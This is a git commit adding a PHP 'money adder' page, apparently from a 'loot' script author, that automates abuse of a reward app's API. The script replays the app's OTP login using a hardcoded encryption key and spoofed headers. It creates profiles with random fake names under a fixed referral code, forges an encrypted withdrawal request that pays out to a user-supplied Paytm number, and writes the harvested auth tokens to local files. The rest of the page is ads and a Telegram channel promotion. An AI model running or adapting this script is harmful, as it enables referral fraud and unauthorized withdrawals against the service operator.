b8f867356cce14b16c6c74ba64bd3e79c1de56aa
RaazKumar121 <70355361+RaazKumar121@users.noreply.github.com>
2020-08-28 07:40:54 +0530

    Add files via upload

---
+++ otp.php
@@ -0,0 +1,361 @@
+
+  <html><head><title>CHAMP LOOTER</title><meta charset='UTF-8'><meta name='theme-color' content='black'/><meta name='viewport' content='width=device-width, initial-scale=1'>	<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Acme&display=swap' rel='stylesheet'>	<link href='https://fonts.googleapis.com/css?family=Bree Serif'rel='stylesheet'></head><style type='text/css'>body{height: auto;width: auto;color: #00FF00;font-family:Bree Serif;text-align:center;padding:10px;margin-top:5%;background-color:#262626;color:#1aefca;letter-spacing:1.5px;}hr{border:0;height:2px;background-image:linear-gradient(to right,rgba(0,0,0,0),rgba(0,255,0,1),rgba(0,0,0,0));}h1{color:#1aefca;}form{margin:10% auto;padding:5px;max-width:580px;text-align:center;}
+input[type=number], select {font-size:16px;color:#00FF00;outline:0;border-radius:5px;background-color: #262626;position:relative;font-family:Bree Serif;text-align:center;padding:8px 10px;height:40px;border:solid 1px #00FF00;margin-bottom:20px;box-shadow:0px 1px 10px 1px #00FF00;width:80%;} input[type=text], select {font-size:16px;color:#00FF00;outline:0;border-radius:5px;background-color: #262626;position:relative;font-family:Bree Serif;text-align:center;padding:8px 10px;height:40px;border:solid 1px #00FF00;margin-bottom:20px;box-shadow:0px 1px 10px 1px #00FF00;width:80%;} input[type=text]:hover {border:solid 1px #FF0000; }
+input[type=submit] { -webkit-tap-highlight-color: transparent; padding: 10px 40px;  color: red; border: 2px solid black; background-image: linear-gradient(45deg, rgb(0, 140, 243), rgb(34, 239, 152)); font-size: 1.2rem; border-radius: 10px; background-color: transparent; margin: 10px; display: inline-block; font-weight: 200; text-decoration: none; box-shadow:1px 5px 0px 2px #00FF00; animation: pulse 0.5s infinite;} input[type=submit]:hover {background:#262626;color:#FF0000;border:solid 1px #FF0000;} fieldset { padding:1px 2px #FF0000; } 
+.error {background:blue; border:1px solid red; padding:2px; text-align:center;font-weight:bold; padding: 8px 10px;color:#000; border-radius: 7px; box-shadow: 1px 2px 2px #aaa; box-sizing: border-box;} .success {background: transparent; color:#00FF00; border:2px solid #ffe222; padding:10px; text-align:center; font-weight:bold; padding: 8px 10px;color:#00FF00;border-radius: 7px; box-shadow: 1px 2px 2px #00FF00; box-sizing: border-box;} 
+ .submit { -webkit-tap-highlight-color: transparent; padding: 10px 40px;  color: red; border: 2px solid black; background-image: linear-gradient(45deg, rgb(0, 140, 243), rgb(34, 239, 152)); font-size: 1.2rem; border-radius: 10px; background-color: transparent; margin: 10px; display: inline-block; font-weight: 200; text-decoration: none; box-shadow:1px 5px 0px 2px #00FF00; animation: pulse 0.5s infinite; }
+.text{font-size:16px;color:#00FF00;outline:0;border-radius:5px;background-color: #262626;position:relative;font-family:Bree Serif;text-align:center;padding:8px 10px;height:40px;border:solid 1px #00FF00;margin-bottom:20px;box-shadow:0px 1px 10px 1px #00FF00;width:80%;}.text:hover{border:solid 1px #FF0000;}.submit:hover{background:#262626;color:#FF0000;border:solid 1px #FF0000;}h3 ::placeholder { color: #80FF80; font-size:16px;}audio{ display:none;}</style><body>
+ <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Wishing Ads -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9899266701358268"
+     data-ad-slot="1981186964"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+ <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- nagganana -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9899266701358268"
+     data-ad-slot="8444645547"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<hr><font color='
+#00FF00' size='5'><b>MONEY ADDER</b><hr></div><hr><font color='
+yellow' size='3'><b>SCRIPT BY=> CHAMP LOOTER </b><hr>
+<center>
+ <?php
+
+error_reporting(0);
+
+echo "<meta http-equiv='refresh' content=200;' />"; 
+
+
+$paytm = $_REQUEST['paytm'];
+$rno = $_REQUEST['rno'];
+$otp = $_REQUEST['otp'];
+$i10 = $_REQUEST['i10'];
+$refer = "IPK0B";
+
+$f = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roooy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
+$fname = $f[mt_rand(0,50)];
+
+$l = array("sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roooy","abhishek","sumit","kapil","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram");
+$lname = $l[mt_rand(0,50)];
+
+define('AES_128_CBC', 'aes-128-cbc');
+$encryption_key = 'Bar12345Bar12345';$iv = '';
+ 
+
+
+ $url = "https://be.payboard.in/PayBoard/rest/user/verifyOTPEnc";
+$sss = ')C
+* t_AE]e13d'.$i10.'","otp":"'.$otp.'","phoneNumber":"'.$rno.'"}';$encrypted = openssl_encrypt($sss, AES_128_CBC, $encryption_key, 0, $iv);
+
+$moh = "$encrypted";
+$data = '{
+  "data": "'.$moh.'"}';
+$mohit[]='appName: dailyboard';
+$mohit[]='vcode: 68';
+$mohit[]='vname: 2.3.3';
+$mohit[]='lang: hi';
+$mohit[]='source: dailyboard';
+$mohit[]='density: xhdpi';
+$mohit[]='Content-Type: application/json; charset=UTF-8';
+$mohigt[]='Content-Length: 951';
+$mohit[]='Host: be.payboard.in';
+$mohit[]='Connection: Keep-Alive';
+$mohitg[]='Accept-Encoding: gzip';
+$mohit[]='User-Agent: okhttp/3.9.0';
+$mohit[]='Content-length: '.strlen($data).'';
+ $ch = curl_init();
+ curl_setopt($ch, CURLOPT_URL,$url);
+ curl_setopt($ch, CURLOPT_POST, 1);
+ curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
+ curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_HTTPHEADER,$mohit);
+ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+ $output2= curl_exec ($ch);
+ $json2=json_decode($output2,true);
+ curl_close ($ch);
+
+ $jwt= $json2['data']['jwtToken'];
+ $xuid=$json2["data"]["xmppUserId"];
+$atok=$json2["data"]["authToken"];
+
+$dateFile = "rcjwtfilexxx.txt"; 
+
+$dataString = "" . $jwt. "\n";
+$file = file_get_contents($dateFile);
+
+if(strpos($file, $dataString) === FALSE) 
+{
+ 
+
+$dataString = "" . $jwt. "\n";
+$fWrite = fopen($dateFile,"a") or die("can't open file"); 
+$wrote = fwrite($fWrite, $dataString); 
+fclose($fWrite);
+}
+
+elseif(count(file($dataFile)) < 1) 
+{
+ 
+//$dataString = "Date:".$date." - Mobile:" . $n[$i] . "- pass:" . $pwd[$i] . " - bal:" . $bal . "\n"; 
+$dataString = "" . $jwt. "\n";
+$fWrite = fopen($dateFile,"a") or die("can't open file"); 
+$wrote = fwrite($fWrite, $dataString); 
+fclose($fWrite);
+}
+
+
+$dateFile1 = "rcxuidfilexxx.txt"; 
+
+$dataString = "" . $xuid. "\n";
+$file1 = file_get_contents($dateFile1);
+
+if(strpos($file1, $dataString) === FALSE) 
+{
+ 
+
+$dataString = "" . $xuid. "\n";
+$fWrite = fopen($dateFile1,"a") or die("can't open file"); 
+$wrote = fwrite($fWrite, $dataString); 
+fclose($fWrite);
+}
+
+elseif(count(file($dataFile1)) < 1) 
+{
+ 
+//$dataString = "Date:".$date." - Mobile:" . $n[$i] . "- pass:" . $pwd[$i] . " - bal:" . $bal . "\n"; 
+$dataString = "" . $xuid. "\n";
+$fWrite = fopen($dateFile1,"a") or die("can't open file"); 
+$wrote = fwrite($fWrite, $dataString); 
+fclose($fWrite);
+}
+
+$dateFile2 = "rcxtokfilexx.txt"; 
+
+$dataString = "" . $atok. "\n";
+$file2 = file_get_contents($dateFile2);
+
+if(strpos($file2, $dataString) === FALSE) 
+{
+ 
+
+$dataString = "" . $atok. "\n";
+$fWrite = fopen($dateFile2,"a") or die("can't open file"); 
+$wrote = fwrite($fWrite, $dataString); 
+fclose($fWrite);
+}
+
+elseif(count(file($dataFile2)) < 1) 
+{
+ 
+//$dataString = "Date:".$date." - Mobile:" . $n[$i] . "- pass:" . $pwd[$i] . " - bal:" . $bal . "\n"; 
+$dataString = "" . $atok. "\n";
+$fWrite = fopen($dateFile2,"a") or die("can't open file"); 
+$wrote = fwrite($fWrite, $dataString); 
+fclose($fWrite);
+}
+
+
+
+
+$st = $json2["message"];
+if($st=="success"){
+	
+	echo'
+
+					<b><font color="blue">	OTP VERIFIED SUCCESSFULLY<hr>
+				 ';
+
+$url1="https://be.payboard.in:443/PayBoard/rest/user";
+
+$data1='{
+	"city":{
+		"id":698,
+		"name":"Mumbai"
+	},
+	"dateOfBirth":"13-03-1985",
+	"firstName":"'.$fname.'",
+	"gender":"male",
+	"lastName":"'.$fname.'",
+	"nickName":"'.$lname.'",
+	"occupation":{
+		"id":4,
+		"name":"Businessman/Businesswoman"
+	},
+	"referrerCode":"'.$refer.'"
+}';
+$h1[]='Content-Type: application/json; charset=UTF-8';
+$h1[]="appName: dailyboard";
+$h1[]="vcode: 68";
+$h1[]="vname: 2.3.3";
+$h1[]="lang: hi";
+$h1[]="source: dailyboard";
+$h1[]="density: xxhdpi";
+$h1[]="X-AUTH-TOKEN: $atok";
+$h1[]="X-Auth-Id: $xuid";
+$h1[]="Authorization: Bearer $jwt";
+
+$ch = curl_init($url1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
+curl_setopt($ch, CURLOPT_HTTPHEADER,$h1);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_POSTFIELDS,$data1);
+$output1= curl_exec ($ch);
+	$json1=json_decode($output1,true);
+	curl_close ($ch);
+	
+	$st1 = $json1["message"];
+if($st1=="success"){
+
+
+$xvv= "LX3XUc1O8uiARGioBS2iO35OLpJdezAGDzIlHML3PZnK2Tw959WH7IQfs4J2eBiR9Qvhis9WJRoKFf10B4tp9WvJkweJenvo2Z5AH69aUsU=";
+
+
+
+$decrypted1 = openssl_decrypt($xvv, AES_128_CBC, $encryption_key, 0, base64_decode($parts[1]));
+$re = explode('7906878390',$decrypted1);
+
+$p1 = $re['0'];
+$p2 = $re['1'];
+
+$nstr = "$p1$paytm$p2";
+
+$encrypted1 = openssl_encrypt($nstr, AES_128_CBC, $encryption_key, 0, base64_decode($parts[1]));
+
+	
+	
+	
+$url20="https://be.payboard.in/PayBoard/rest/withdrawal/withDrawlEnc-rank";
+
+$data20='{"data":"'.$encrypted1.'"}';
+
+
+$h23[]="Host: be.payboard.in";
+$h23[]="user-agent: okhttp/3.10.0";
+$h23[]="content-type: application/json; charset=UTF-8";
+$h23[]="accept-encoding: gzip";
+$h23[]="density: xhdpi";
+$h23[]="source: dailyboard";
+$h23[]="lang: hi";
+$h23[]="vname: 2.3.15";
+$h23[]="vcode: 80";
+$h23[]="appname: dailyboard";
+$h23[]="x-auth-token: $atok";
+$h23[]="x-auth-id: $xuid";
+$h23[]="authorization: Bearer $jwt";
+
+$ch=curl_init($url20);
+		curl_setopt($ch, CURLOPT_HTTPHEADER, $h23);
+		curl_setopt($ch, CURLOPT_POST, TRUE);
+		curl_setopt($ch, CURLOPT_POSTFIELDS, $data20);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
+		curl_setopt($ch, CURLOPT_ENCODING, 'gzip'); 
+$output20= curl_exec ($ch);
+	$json20=json_decode($output20,1);
+	curl_close ($ch);
+	
+	$msgg = $json20['data']['messages']['userBalanceLess'];
+	$msggg = $json20['messages'];
+	echo"<div class='success'>
+					<font color=""><b>	Please Wait 24hr Or Check Your Paytm Now Time Try Your All Numbers 
+					 </div> ";}}
+	else{echo"<font color='blue'><b>PLEASE ENTER VALID OTP";}
+	
+?>
+	 
+ 	<br>
+<script type='text/javascript'>(function() {var script=document.createElement('script');script.type='text/javascript';script.async =true;script.src='//telegram.im/widget-button/index.php?id=@CHAMPLOOTER';document.getElementsByTagName('head')[0].appendChild(script);})();</script>
+<center><a href='http://telegram.dog/CHAMPLOOTER' target='_blank' class='telegramim_button telegramim_shadow telegramim_pulse' style='font-size:20px;width:93%;background: black;box-shadow:1px 1px 3px #00FF00;color:#ffffff ; position:center;text-align:center; border:1px solid red;border-radius:8px;' title=''><i></i> JOIN OUR TELEGRAM CHANNEL <small>[ Now <span class='telegramim_count' data-for='@CHAMPLOOTER'>...</span> Subscribers ]</small></a></center> 
+<br>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- nagpurigaana1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9899266701358268"
+     data-ad-slot="5898331035"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+ <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- nagpurigaana2 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9899266701358268"
+     data-ad-slot="1192799269"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+ <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- nagputigaana3 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9899266701358268"
+     data-ad-slot="9564019972"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<hr>
+<!-- BEGIN: Powered by Supercounters.com -->
+<center>[💟~<script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1587931," USERS ONLINE","00ff00");</script>~💟]<br><noscript><a href="https://www.onlinetrickss.xyz/">supercounters.com</a></noscript>
+</center>
+<!-- END: Powered by Supercounters.com -->
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- naggaana -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9899266701358268"
+     data-ad-slot="5349663281"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+<hr>
+<center><a href='https://hostinglily.com/aff.php?aff=3' target='_blank' style=' color:yellow;'><i>HOSTING PROVIDED BY HOSTINGLILY</i>
+<hr>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- Wishing Ads -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9899266701358268"
+     data-ad-slot="1981186964"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+ <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- nagganana -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9899266701358268"
+     data-ad-slot="8444645547"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
